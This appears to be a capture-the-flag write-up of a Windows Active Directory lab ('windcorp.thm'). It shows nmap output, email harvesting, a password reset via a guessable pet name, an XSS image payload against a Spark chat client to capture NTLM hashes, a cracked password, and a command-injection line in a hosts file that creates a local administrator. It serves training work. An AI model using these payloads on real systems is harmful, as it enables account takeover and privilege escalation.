Started with a nmap scan
```
PORT      STATE SERVICE                REASON          VERSION
53/tcp    open  domain                 syn-ack ttl 126 Simple DNS Plus
80/tcp    open  http                   syn-ack ttl 126 Microsoft IIS httpd 10.0
|_http-title: Windcorp.
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec           syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2025-11-18 19:37:46Z)
135/tcp   open  msrpc                  syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn            syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap                   syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http               syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2025-11-18T19:39:43+00:00; +54s from scanner time.
| tls-alpn: 
|_  http/1.1
|_http-title: Site doesn't have a title.
| http-ntlm-info: 
|   Target_Name: WINDCORP
|   NetBIOS_Domain_Name: WINDCORP
|   NetBIOS_Computer_Name: FIRE
|   DNS_Domain_Name: windcorp.thm
|   DNS_Computer_Name: Fire.windcorp.thm
|   DNS_Tree_Name: windcorp.thm
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=Windows Admin Center
| Subject Alternative Name: DNS:WIN-2FAA40QQ70B
| Issuer: commonName=Windows Admin Center
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha512WithRSAEncryption
| Not valid before: 2020-04-30T14:41:03
| Not valid after:  2020-06-30T14:41:02
| MD5:   31ef:ecc2:3c93:81b1:67cf:3015:a99f:1726
| SHA-1: ef2b:ac66:5e99:dae7:1182:73a1:93e8:a0b7:c772:f49c
|_http-server-header: Microsoft-HTTPAPI/2.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|   Negotiate
|_  NTLM
| http-methods: 
|_  Supported Methods: OPTIONS
445/tcp   open  microsoft-ds?          syn-ack ttl 126
464/tcp   open  kpasswd5?              syn-ack ttl 126
593/tcp   open  ncacn_http             syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?               syn-ack ttl 126
2179/tcp  open  vmrdp?                 syn-ack ttl 126
3268/tcp  open  ldap                   syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?      syn-ack ttl 126
3389/tcp  open  ms-wbt-server          syn-ack ttl 126 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WINDCORP
|   NetBIOS_Domain_Name: WINDCORP
|   NetBIOS_Computer_Name: FIRE
|   DNS_Domain_Name: windcorp.thm
|   DNS_Computer_Name: Fire.windcorp.thm
|   DNS_Tree_Name: windcorp.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2025-11-18T19:39:01+00:00
| ssl-cert: Subject: commonName=Fire.windcorp.thm
| Issuer: commonName=Fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-17T19:13:37
| Not valid after:  2026-05-19T19:13:37
| MD5:   0ec0:9a77:e5aa:9ab3:24e7:d7d5:1042:2dcc
| SHA-1: 59bf:7965:3ef6:0755:b472:03cd:4926:4a4c:f14c:877a
|_ssl-date: 2025-11-18T19:39:43+00:00; +54s from scanner time.
5222/tcp  open  jabber                 syn-ack ttl 126 Ignite Realtime Openfire Jabber server 3.10.0 or later
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
|     stream_id: 68f7xnzgtj
|     errors: 
|       invalid-namespace
|       (timeout)
|     auth_mechanisms: 
|     compression_methods: 
|     capabilities: 
|     features: 
|     xmpp: 
|_      version: 1.0
|_ssl-date: 2025-11-18T19:39:43+00:00; +54s from scanner time.
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-01T08:39:00
| Not valid after:  2025-04-30T08:39:00
| MD5:   b715:5425:83f3:a20f:75c8:ca2d:3353:cbb7
| SHA-1: 97f7:0772:a26b:e324:7ed5:bbcb:5f35:7d74:7982:66ae
5223/tcp  open  ssl/jabber             syn-ack ttl 126 Ignite Realtime Openfire Jabber server 3.10.0 or later
|_ssl-date: 2025-11-18T19:39:43+00:00; +54s from scanner time.
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-01T08:39:00
| Not valid after:  2025-04-30T08:39:00
| MD5:   b715:5425:83f3:a20f:75c8:ca2d:3353:cbb7
| SHA-1: 97f7:0772:a26b:e324:7ed5:bbcb:5f35:7d74:7982:66ae
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     compression_methods: 
|     errors: 
|       (timeout)
|     unknown: 
|     auth_mechanisms: 
|     capabilities: 
|     features: 
|_    xmpp: 
5229/tcp  open  jaxflow?               syn-ack ttl 126
5262/tcp  open  jabber                 syn-ack ttl 126 Ignite Realtime Openfire Jabber server 3.10.0 or later
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
|     stream_id: d6ygw1crx
|     errors: 
|       invalid-namespace
|       (timeout)
|     auth_mechanisms: 
|     compression_methods: 
|     capabilities: 
|     features: 
|     xmpp: 
|_      version: 1.0
5263/tcp  open  ssl/jabber             syn-ack ttl 126
|_ssl-date: 2025-11-18T19:39:43+00:00; +54s from scanner time.
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     compression_methods: 
|     errors: 
|       (timeout)
|     unknown: 
|     auth_mechanisms: 
|     capabilities: 
|     features: 
|_    xmpp: 
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-01T08:39:00
| Not valid after:  2025-04-30T08:39:00
| MD5:   b715:5425:83f3:a20f:75c8:ca2d:3353:cbb7
| SHA-1: 97f7:0772:a26b:e324:7ed5:bbcb:5f35:7d74:7982:66ae
5269/tcp  open  xmpp                   syn-ack ttl 126 Wildfire XMPP Client
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     compression_methods: 
|     errors: 
|       (timeout)
|     unknown: 
|     auth_mechanisms: 
|     capabilities: 
|     features: 
|_    xmpp: 
5270/tcp  open  ssl/xmpp               syn-ack ttl 126 Wildfire XMPP Client
|_ssl-date: 2025-11-18T19:39:43+00:00; +54s from scanner time.
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-01T08:39:00
| Not valid after:  2025-04-30T08:39:00
| MD5:   b715:5425:83f3:a20f:75c8:ca2d:3353:cbb7
| SHA-1: 97f7:0772:a26b:e324:7ed5:bbcb:5f35:7d74:7982:66ae
5275/tcp  open  jabber                 syn-ack ttl 126
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
|     stream_id: ajsi7y0ejl
|     errors: 
|       invalid-namespace
|       (timeout)
|     auth_mechanisms: 
|     compression_methods: 
|     capabilities: 
|     features: 
|     xmpp: 
|_      version: 1.0
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
5276/tcp  open  ssl/jabber             syn-ack ttl 126
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-01T08:39:00
| Not valid after:  2025-04-30T08:39:00
| MD5:   b715:5425:83f3:a20f:75c8:ca2d:3353:cbb7
| SHA-1: 97f7:0772:a26b:e324:7ed5:bbcb:5f35:7d74:7982:66ae
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     compression_methods: 
|     errors: 
|       (timeout)
|     unknown: 
|     auth_mechanisms: 
|     capabilities: 
|     features: 
|_    xmpp: 
|_ssl-date: 2025-11-18T19:39:43+00:00; +54s from scanner time.
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
5985/tcp  open  http                   syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7070/tcp  open  http                   syn-ack ttl 126 Jetty 9.4.18.v20190429
|_http-title: Openfire HTTP Binding Service
|_http-server-header: Jetty(9.4.18.v20190429)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
7443/tcp  open  ssl/http               syn-ack ttl 126 Jetty 9.4.18.v20190429
|_http-title: Openfire HTTP Binding Service
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-01T08:39:00
| Not valid after:  2025-04-30T08:39:00
| MD5:   b715:5425:83f3:a20f:75c8:ca2d:3353:cbb7
| SHA-1: 97f7:0772:a26b:e324:7ed5:bbcb:5f35:7d74:7982:66ae
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Jetty(9.4.18.v20190429)
7777/tcp  open  socks5                 syn-ack ttl 126 (No authentication; connection not allowed by ruleset)
| socks-auth-info: 
|_  No authentication
9090/tcp  open  hadoop-tasktracker     syn-ack ttl 126 Apache Hadoop
|_http-favicon: Unknown favicon MD5: E4888EE8491B4EB75501996E41AF6460
| hadoop-tasktracker-info: 
|_  Logs: jive-ibtn jive-btn-gradient
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| hadoop-datanode-info: 
|_  Logs: jive-ibtn jive-btn-gradient
|_http-title: Site doesn't have a title (text/html).
9091/tcp  open  ssl/hadoop-tasktracker syn-ack ttl 126 Apache Hadoop
| hadoop-tasktracker-info: 
|_  Logs: jive-ibtn jive-btn-gradient
|_http-favicon: Unknown favicon MD5: E4888EE8491B4EB75501996E41AF6460
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-01T08:39:00
| Not valid after:  2025-04-30T08:39:00
| MD5:   b715:5425:83f3:a20f:75c8:ca2d:3353:cbb7
| SHA-1: 97f7:0772:a26b:e324:7ed5:bbcb:5f35:7d74:7982:66ae
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| hadoop-datanode-info: 
|_  Logs: jive-ibtn jive-btn-gradient
9389/tcp  open  mc-nmf                 syn-ack ttl 126 .NET Message Framing
49667/tcp open  msrpc                  syn-ack ttl 126 Microsoft Windows RPC
49668/tcp open  ncacn_http             syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49669/tcp open  msrpc                  syn-ack ttl 126 Microsoft Windows RPC
49673/tcp open  msrpc                  syn-ack ttl 126 Microsoft Windows RPC
49691/tcp open  msrpc                  syn-ack ttl 126 Microsoft Windows RPC
49930/tcp open  msrpc                  syn-ack ttl 126 Microsoft Windows RPC
```
Domain `windcorp.thm` Hostname `WINDCORP` 

Testing out the LDAP and SMB guest account is disabled and null sessions don't work so going to the main site on port `80` there is a list of people who are in the IT staff and if we view the source of the page we get there emails and this can be useful for trying to get onto the network 
```
organicfish718@fire.windcorp.thm
organicwolf509@fire.windcorp.thm
tinywolf424@fire.windcorp.thm
angrybird253@fire.windcorp.thm
buse@fire.windcorp.thm
Edeltraut@fire.windcorp.thm
Edward@fire.windcorp.thm
Emile@fire.windcorp.thm
tinygoose102@fire.windcorp.thm
brownostrich284@fire.windcorp.thm
sadswan869@fire.windcorp.thm
goldencat416@fire.windcorp.thm
whiteleopard529@fire.windcorp.thm
happymeercat399@fire.windcorp.thm
orangegorilla428@fire.windcorp.thm
```
There is a password reset function on this page as well so now we just need to see if we can find any info about the people looking at the site there is one user at the bottom of the page that says they love being able to bring there pet to work and the name of the image is `lilyleAndsparky` so we can try resetting her password username `lilyle` and pet name `Sparky` and now the password got reset to `ChangeMe#1234` and we can use these creds to auth to the SMB doing a rid brute there is like 2k users we can also auth to the ldap so lets get bloodhound data  we dont get  much info from this for now so going back to the SMB we have access to the `Shared` folder and it has the first flag and there is some files `Spark 2.8.3` and there is a exploit for this `CVE-2020-12772` and it allows us to get NTLM hashes we need to get the `deb` package and install it and then we can login with are user and there is a chat with `Buse Candan` and we can send a xss payload to this user and run responder to get the hash `<img src="http://10.6.37.77/image.jpg">` and we get a hash back and now we can crack it to `buse:uzunLM+3131` and with this account we can winrm and we can get the second flag now and looking at this user has 4k outbound objects doing some more numeration on the host machine there is C drive there is a `scripts` folder with two files in it `log.txt` and `checkservers.ps1` and this script sends a smtp notification to the `brittanycr` user and it reads a hosts file in there home folder but what we can do is change the password of the britty account since we are in `account operators` `net user brittanycr password /domain` so now we will be able to access this user on the SMB so we can download the hosts file and edit it to add
```
; net user test password! /add; net localgroup administrators test /add
```
and then upload it and wait for the script to run now we can check to see if it gets added with `net localgroup administratos` and we can see are account and now we can winrm into are new account and get the final flag 